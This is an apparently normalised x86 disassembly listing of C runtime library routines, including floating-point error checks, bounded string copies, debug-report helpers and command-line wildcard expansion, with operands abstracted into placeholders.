fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_4435f8
sub_435eb0
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0xc
fst [ esp ]
call sub_443478
call sub_435f08
add esp 0xc
retn
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_4435e0
sub_435f08
push edx
fwait
fnstcw [ esp ]
je r-xdata
test eax 0xfffff
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
pop edx
retn
cmp [ esp + 0x8 ] 0x0
jne r-xdata
fsin
fwait
fnstsw ax
sahf
jpe r-xdata
fldcw [ r--data ]
fstp st0
fld [ r--data ]
mov eax 0x1
cmp [ rw-data ] 0x0
jne r-xdata
fld [ r--data ]
fxch st1
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
mov edx 0x1e
lea ecx [ r--data ]
call sub_443597
fprem1
fwait
fnstsw ax
sahf
jpe r-xdata
fstp st1
fsin
jmp r-xdata
mov edx 0x1e
lea ecx [ r--data ]
jmp r-xdata
pop edx
retn
fldcw [ esp ]
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_443597
pop edx
retn
sub_435f92
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
push esi
push edi
je r-xdata
mov edi sub_429e7b
push [ rw-data ]
call [ DecodePointer@IAT ]
mov edi eax
jmp r-xdata
sub eax 0x1b
je r-xdata
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax 0x1a
jg r-xdata
mov [ ebp - 0x24 ] 0x2
sub eax 0x1
je r-xdata
fld1
cmp eax 0xe
jg r-xdata
fld [ ebp - 0xc ]
fstp [ esi ]
call sub_430f56
mov [ eax ] 0x22
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x15
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
sub eax 0xf
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx edi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x24 ] 0x1
fld [ eax ]
mov eax [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fld [ eax ]
lea eax [ ebp - 0x24 ]
fstp [ ebp - 0x14 ]
fld [ esi ]
push eax
fstp [ ebp - 0xc ]
call [ r--data ]
call edi
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x24 ] 0x3
mov [ ebp - 0x20 ] r--data
jmp r-xdata
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_430f56
mov [ eax ] 0x21
jmp r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx edi
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x24 ] 0x4
fld [ eax ]
mov eax [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fld [ eax ]
lea eax [ ebp - 0x24 ]
fstp [ ebp - 0x14 ]
fld [ esi ]
push eax
fstp [ ebp - 0xc ]
call [ r--data ]
call edi
pop ecx
jmp r-xdata
mov [ ebp - 0x24 ] 0x3
jmp r-xdata
sub eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx edi
mov esi [ ebp + 0x10 ]
fld [ eax ]
mov eax [ ebp + 0xc ]
fstp [ ebp - 0x1c ]
fld [ eax ]
lea eax [ ebp - 0x24 ]
fstp [ ebp - 0x14 ]
fld [ esi ]
push eax
fstp [ ebp - 0xc ]
call [ r--data ]
call edi
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x1
je r-xdata
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x3ab
je r-xdata
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x20 ] r--data
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
fld [ eax ]
jmp r-xdata
sub eax 0x1
jne r-xdata
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] r--data
jmp r-xdata
sub eax 0x1
jne r-xdata
mov eax [ ebp + 0x10 ]
fstp [ eax ]
jmp r-xdata
mov [ ebp - 0x20 ] r--data
sub_4361aa
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] 0x1
pop ebp
retn
and [ rw-data ] 0x0
pop ebp
retn
sub_4361fd
push edx
fwait
fnstcw [ esp ]
mov eax [ esp + 0xc ]
je r-xdata
test eax 0xfffff
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
call sub_44341c
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
test eax 0x80000000
jne r-xdata
call sub_443405
cmp [ rw-data ] 0x0
jne r-xdata
and eax 0x80000000
je r-xdata
test eax 0x7ff00000
jne r-xdata
fsqrt
cmp [ esp ] 0x27f
je r-xdata
mov edx 0x5
lea ecx [ r--data ]
call sub_443597
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
fstp st0
fld [ r--data ]
mov eax 0x1
test eax 0xfffff
jne r-xdata
mov edx 0x5
lea ecx [ r--data ]
jmp r-xdata
pop edx
retn
fldcw [ esp ]
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
jmp r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_443597
pop edx
retn
sub_43629a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_4362d9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_430f56
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov edi [ ebp + 0x10 ]
test edi edi
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
test ecx ecx
je r-xdata
add edx 0x2
sub ecx 0x1
jne r-xdata
sub edi edx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_430f56
push 0x22
jmp r-xdata
movzx eax [ edi + edx ]
mov [ edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
sub_43634b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
call sub_430f56
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov edx edi
xor esi esi
xor eax eax
mov [ edi ] ax
test ecx ecx
je r-xdata
add edx 0x2
sub ecx 0x1
jne r-xdata
sub ebx edx
cmp [ edx ] si
je r-xdata
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov [ edi ] ax
call sub_430f56
push 0x22
jmp r-xdata
movzx eax [ ebx + edx ]
mov [ edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_430e30
sub_4363c0
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
je r-xdata
call sub_430f56
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push edi
mov edi edx
sub esi edx
xor eax eax
mov [ edx ] ax
xor eax eax
pop edi
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
pop esi
pop ebp
retn
mov [ edx ] ax
call sub_430f56
push 0x22
jmp r-xdata
movzx eax [ esi + edi ]
mov [ edi ] ax
lea edi [ edi + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
sub_436420
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
je r-xdata
call sub_430f56
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push edi
mov edi edx
sub esi edx
xor eax eax
mov [ edx ] ax
pop edi
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
xor esi esi
jmp r-xdata
xor eax eax
mov [ edx ] ax
call sub_430f56
push 0x22
jmp r-xdata
movzx eax [ esi + edi ]
mov [ edi ] ax
lea edi [ edi + 0x2 ]
test ax ax
je r-xdata
mov eax esi
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_430e30
sub_436484
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_430f56
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
xor eax eax
mov [ ecx ] ax
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
sub esi ecx
mov ebx eax
push edi
mov edi ecx
cmp edx 0xffffffff
jne r-xdata
xor eax eax
mov [ ecx ] ax
movzx eax [ esi + edi ]
mov [ edi ] ax
lea edi [ edi + 0x2 ]
test ax ax
je r-xdata
movzx eax [ esi + edi ]
mov [ edi ] ax
lea edi [ edi + 0x2 ]
test ax ax
je r-xdata
test edx edx
mov edx [ ebp + 0x14 ]
jne r-xdata
sub ebx 0x1
je r-xdata
pop edi
test ebx ebx
pop ebx
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] ax
sub edx 0x1
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
jmp r-xdata
xor eax eax
mov [ ecx ] ax
call sub_430f56
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
push 0x50
mov [ ecx + eax * 2 - 0x2 ] dx
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
sub_43655c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
call sub_430333
mov bl al
call [ IsDebuggerPresent@IAT ]
mov esi [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_4301b7
test al al
jne r-xdata
test esi esi
je r-xdata
test bl bl
je r-xdata
call [ IsDebuggerPresent@IAT ]
neg eax
sbb eax eax
neg eax
add eax 0x3
jmp r-xdata
test bl bl
je r-xdata
push esi
call [ OutputDebugStringA@IAT ]
call sub_43028d
test al al
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
push edi
push edi
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
push sub_4367ce
push edi
push edi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x4 ] edi
call [ CreateThread@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x4
pop eax
jmp r-xdata
call sub_4301e8
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0x10 ]
or eax 0x200000
push eax
push [ ebp + 0xc ]
push esi
push 0x0
jmp r-xdata
mov eax edi
pop edi
jmp r-xdata
push edi
push 0xffffffff
push esi
call [ WaitForSingleObjectEx@IAT ]
test eax eax
jne r-xdata
call sub_42ffe1
cmp esi 0xffffffff
je r-xdata
mov edi [ ebp - 0x4 ]
push esi
call [ CloseHandle@IAT ]
sub_436635
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
call sub_430333
mov bl al
call [ IsDebuggerPresent@IAT ]
mov esi [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_4301b7
test al al
jne r-xdata
test esi esi
je r-xdata
test bl bl
je r-xdata
call [ IsDebuggerPresent@IAT ]
neg eax
sbb eax eax
neg eax
add eax 0x3
jmp r-xdata
test bl bl
je r-xdata
push esi
call [ OutputDebugStringW@IAT ]
call sub_43028d
test al al
jne r-xdata
mov eax [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
push edi
push edi
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
push sub_4367f0
push edi
push edi
mov [ ebp - 0xc ] esi
mov [ ebp - 0x4 ] edi
call [ CreateThread@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x4
pop eax
jmp r-xdata
call sub_4301e8
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0x10 ]
or eax 0x200000
push eax
push [ ebp + 0xc ]
push esi
push 0x0
jmp r-xdata
mov eax edi
pop edi
jmp r-xdata
push edi
push 0xffffffff
push esi
call [ WaitForSingleObjectEx@IAT ]
test eax eax
jne r-xdata
call sub_43002a
cmp esi 0xffffffff
je r-xdata
mov edi [ ebp - 0x4 ]
push esi
call [ CloseHandle@IAT ]
sub_43670e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42ffe1
pop ebp
retn
sub_43672e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43002a
pop ebp
retn
sub_43674e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42ffe1
pop ebp
retn
sub_43676e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43002a
pop ebp
retn
sub_43678e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42ffe1
pop ebp
retn
sub_4367ae
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push [ eax ]
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_43002a
pop ebp
retn
sub_4367ce
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push [ esi + 0x8 ]
push [ esi ]
push [ esi + 0x4 ]
push 0x0
call sub_42ffe1
mov [ esi + 0xc ] eax
xor eax eax
pop esi
pop ebp
retn 0x4
sub_4367f0
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push [ esi + 0x8 ]
push [ esi ]
push [ esi + 0x4 ]
push 0x0
call sub_43002a
mov [ esi + 0xc ] eax
xor eax eax
pop esi
pop ebp
retn 0x4
sub_4368b9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
sbb eax eax
neg eax
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
sub_4368d1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
sbb eax eax
neg eax
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
sub_4368e9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x20
push esi
test eax eax
jne r-xdata
mov esi [ ebp + 0x8 ]
xor ecx ecx
push ebx
push edi
mov [ eax ] ecx
mov edi ecx
mov ebx ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ecx
cmp [ esi ] ecx
je r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
and [ ebp - 0x8 ] 0x0
mov eax ebx
sub eax edi
mov [ ebp - 0x4 ] ecx
mov edx eax
add eax 0x3
sar edx 0x2
inc edx
shr eax 0x2
cmp ebx edi
mov [ ebp - 0xc ] edx
sbb esi esi
not esi
and esi eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0x3f2a
push eax
push [ esi ]
mov [ ebp - 0x2 ] cl
call sub_443cf0
pop ecx
pop ecx
test eax eax
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
push 0x1
push [ ebp - 0x4 ]
push edx
call sub_42a60b
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov edx edi
mov ebx ecx
lea ecx [ ebp - 0x20 ]
push ecx
push eax
push [ esi ]
call sub_436d7a
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push [ esi ]
call sub_436c46
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0xc ]
lea eax [ esi + eax * 4 ]
mov [ ebp - 0x10 ] eax
mov edx eax
mov [ ebp - 0xc ] edx
cmp edi ebx
je r-xdata
or edi 0xffffffff
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx [ ebp - 0x4 ]
inc ebx
mov eax [ ebp - 0x8 ]
add ebx ecx
add edx 0x4
inc eax
mov [ ebp - 0x8 ] eax
cmp eax esi
jne r-xdata
lea ecx [ ebp - 0x20 ]
call sub_4372ad
mov eax edi
pop edi
pop ebx
add esi 0x4
xor ecx ecx
cmp [ esi ] ecx
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
mov eax [ ebp + 0xc ]
xor edi edi
mov [ eax ] esi
mov eax esi
sub eax edi
mov [ ebp - 0x14 ] eax
push 0x0
call sub_42d3b1
pop ecx
mov ecx [ edx ]
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp - 0x1c ]
mov ebx [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx [ ebp - 0x8 ]
lea eax [ ecx + 0x1 ]
push eax
push [ edi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
sub eax edx
add eax [ ebp - 0x4 ]
push eax
push edx
call sub_443cdb
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov [ eax + edi ] edx
add edi 0x4
add edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
cmp edi ebx
jne r-xdata
mov ecx [ edi ]
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x8 ] eax
sub_436a79
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x2c ] eax
push esi
mov esi [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor ecx ecx
push ebx
push edi
mov [ eax ] ecx
mov edi ecx
mov ebx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ecx
cmp [ esi ] ecx
je r-xdata
call sub_430f56
push 0x16
pop esi
mov [ eax ] esi
call sub_430e30
mov eax esi
jmp r-xdata
mov eax ebx
mov [ ebp - 0x14 ] ecx
sub eax edi
xor ecx ecx
mov edx eax
mov [ ebp - 0x10 ] ecx
sar edx 0x2
add eax 0x3
inc edx
shr eax 0x2
cmp ebx edi
mov [ ebp - 0x18 ] edx
sbb esi esi
not esi
and esi eax
je r-xdata
push 0x2a
pop eax
mov [ ebp - 0xc ] ax
push 0x3f
pop eax
mov [ ebp - 0xa ] ax
xor eax eax
mov [ ebp - 0x8 ] ax
lea eax [ ebp - 0xc ]
push eax
push [ esi ]
call sub_43a3e9
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
push 0x2
push [ ebp - 0x14 ]
push edx
call sub_42a60b
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ebx [ ebp - 0x14 ]
mov edx edi
lea ecx [ ebp - 0x28 ]
push ecx
push eax
push [ esi ]
call sub_436efe
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
xor eax eax
push eax
push eax
push [ esi ]
call sub_436cdc
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x18 ]
lea eax [ esi + eax * 4 ]
mov [ ebp - 0x30 ] eax
mov edx eax
mov [ ebp - 0x18 ] edx
cmp edi ebx
je r-xdata
or edi 0xffffffff
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x1c ]
jne r-xdata
sub ecx [ ebp - 0x14 ]
inc ebx
mov eax [ ebp - 0x10 ]
add edx 0x4
sar ecx 0x1
add ebx ecx
inc eax
mov [ ebp - 0x10 ] eax
cmp eax esi
jne r-xdata
lea ecx [ ebp - 0x28 ]
call sub_4372d2
mov eax edi
pop edi
pop ebx
add esi 0x4
xor ecx ecx
cmp [ esi ] ecx
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] esi
xor eax eax
mov edi eax
mov eax esi
sub eax edi
mov [ ebp - 0xc ] eax
push eax
call sub_42d3b1
pop ecx
mov ecx [ edx ]
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] ebx
mov ebx [ ebp - 0x24 ]
mov ebx [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x1c ]
jne r-xdata
sub ecx [ ebp - 0x10 ]
sar ecx 0x1
lea eax [ ecx + 0x1 ]
mov ecx edx
sub ecx [ ebp - 0x30 ]
push eax
push [ edi ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
sar ecx 0x1
sub eax ecx
push eax
push edx
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
mov [ eax + edi ] edx
add edi 0x4
mov eax [ ebp - 0x10 ]
lea edx [ edx + eax * 2 ]
mov [ ebp - 0x18 ] edx
cmp edi ebx
jne r-xdata
mov ecx [ edi ]
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x10 ] eax
sub_436c46
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + 0x1 ]
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
or eax 0xffffffff
push edi
mov edi [ ebp + 0x10 ]
inc ecx
sub eax edi
mov [ ebp - 0x4 ] ecx
cmp ecx eax
jbe r-xdata
push ebx
push esi
lea ebx [ edi + 0x1 ]
add ebx ecx
push 0x1
push ebx
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push 0xc
pop eax
jmp r-xdata
push [ ebp - 0x4 ]
sub ebx edi
lea eax [ esi + edi ]
push [ ebp + 0x8 ]
push ebx
push eax
call sub_443cdb
add esp 0x10
test eax eax
jne r-xdata
push edi
push [ ebp + 0xc ]
push ebx
push esi
call sub_443cdb
add esp 0x10
test eax eax
jne r-xdata
pop edi
mov esp ebp
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
mov ecx [ ebp + 0x14 ]
push esi
call sub_437347
push 0x0
mov esi eax
call sub_42d3b1
pop ecx
mov eax esi
pop esi
pop ebx
sub_436cdc
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push edi
xor ebx ebx
lea edx [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
mov edi [ ebp + 0x10 ]
sub ecx edx
sar ecx 0x1
or eax 0xffffffff
inc ecx
sub eax edi
mov [ ebp - 0x4 ] ecx
cmp ecx eax
jbe r-xdata
push esi
lea ebx [ edi + 0x1 ]
add ebx ecx
push 0x2
push ebx
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push 0xc
pop eax
jmp r-xdata
push [ ebp - 0x4 ]
sub ebx edi
lea eax [ esi + edi * 2 ]
push [ ebp + 0x8 ]
push ebx
push eax
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
push edi
push [ ebp + 0xc ]
push ebx
push esi
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
mov ecx [ ebp + 0x14 ]
push esi
call sub_43737c
push 0x0
mov esi eax
call sub_42d3b1
pop ecx
mov eax esi
pop esi
sub_436d7a
mov edi edi
push ebp
mov ebp esp
sub esp 0x150
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
push edi
mov [ ebp - 0x148 ] esi
jmp r-xdata
cmp ecx ebx
jne r-xdata
mov al [ ecx ]
cmp al 0x2f
je r-xdata
mov dl [ ecx ]
cmp dl 0x3a
jne r-xdata
cmp al 0x5c
je r-xdata
xor edi edi
cmp dl 0x2f
je r-xdata
lea eax [ ebx + 0x1 ]
cmp ecx eax
je r-xdata
cmp al 0x3a
je r-xdata
xor eax eax
inc eax
cmp dl 0x5c
je r-xdata
push esi
xor edi edi
push edi
push edi
push ebx
call sub_436c46
add esp 0x10
jmp r-xdata
push ecx
push ebx
call sub_443d30
pop ecx
pop ecx
mov ecx eax
mov ecx [ eax + 0x4 ]
sub ecx [ eax ]
sar ecx 0x2
mov [ ebp - 0x150 ] ecx
push eax
push edi
push edi
push ebx
call sub_436c46
add esp 0x10
cmp dl 0x3a
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
push eax
push [ ebp - 0x14c ]
lea eax [ ebp - 0x118 ]
push ebx
push eax
call sub_436c46
add esp 0x10
test eax eax
jne r-xdata
mov cl [ ebp - 0x117 ]
test cl cl
je r-xdata
mov eax edi
push esi
call [ FindClose@IAT ]
mov eax edi
jmp r-xdata
mov edi eax
lea eax [ ebp - 0x144 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
mov eax [ ebp - 0x148 ]
jne r-xdata
cmp cl 0x2e
jne r-xdata
movzx eax al
sub ecx ebx
inc ecx
neg eax
push 0x140
sbb eax eax
and eax ecx
mov [ ebp - 0x14c ] eax
lea eax [ ebp - 0x144 ]
push edi
push eax
call sub_40dea0
add esp 0xc
lea eax [ ebp - 0x144 ]
push edi
push edi
push edi
push eax
push edi
push ebx
call [ FindFirstFileExA@IAT ]
mov esi eax
mov eax [ ebp - 0x148 ]
cmp esi 0xffffffff
jne r-xdata
cmp [ ebp - 0x118 ] 0x2e
jne r-xdata
mov edx [ eax ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x150 ]
sub eax edx
sar eax 0x2
cmp ecx eax
je r-xdata
cmp [ ebp - 0x116 ] 0x0
je r-xdata
cmp esi 0xffffffff
je r-xdata
push sub_4368b9
sub eax ecx
push 0x4
push eax
lea eax [ edx + ecx * 4 ]
push eax
call sub_443890
add esp 0x10
jmp r-xdata
sub_436efe
mov edi edi
push ebp
mov ebp esp
sub esp 0x260
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
